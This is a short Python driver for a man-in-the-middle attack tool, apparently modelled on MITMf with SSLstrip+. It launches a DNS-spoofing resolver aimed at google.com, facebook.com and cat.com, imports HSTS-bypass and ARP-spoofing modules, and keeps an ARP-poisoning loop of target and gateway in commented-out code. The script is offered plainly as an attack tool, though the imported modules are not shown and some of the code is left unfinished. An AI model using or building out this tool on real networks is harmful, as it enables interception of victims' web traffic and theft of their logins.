import argparse
import threading

from mitmproxy_sslstrip import parse_hsts_bypass_config
from dns_resolver import DNSResolver
from arp_spoof import arp_spoof, restore

def main():
    parser = argparse.ArgumentParser(description="MITMf with SSLstrip+ and custom DNS resolver")
    # parser.add_argument('--bypass-hsts', action='store_true', help="Enable HSTS bypass")
    # parser.add_argument('--config', type=str, help="Path to hsts_bypass.cfg", default='hsts_bypass.cfg')
    # parser.add_argument('--target-ip', type=str, required=True, help="Target IP for ARP spoofing")
    # parser.add_argument('--gateway-ip', type=str, required=True, help="Gateway IP for ARP spoofing")

    args = parser.parse_args()

    custom_domains = ["cat.com", 'google.com', 'facebook.com']

    # if args.bypass_hsts:
    dns_resolver = DNSResolver(custom_domains)
    threading.Thread(target=dns_resolver.start).start()
        
        # try:
        #     while True:
        #         arp_spoof(args.target_ip, args.gateway_ip)
        #         arp_spoof(args.gateway_ip, args.target_ip)
        #         time.sleep(1)
        # except KeyboardInterrupt:
        #     restore(args.target_ip, args.gateway_ip)
        #     restore(args.gateway_ip, args.target_ip)

if __name__ == "__main__":
    main()
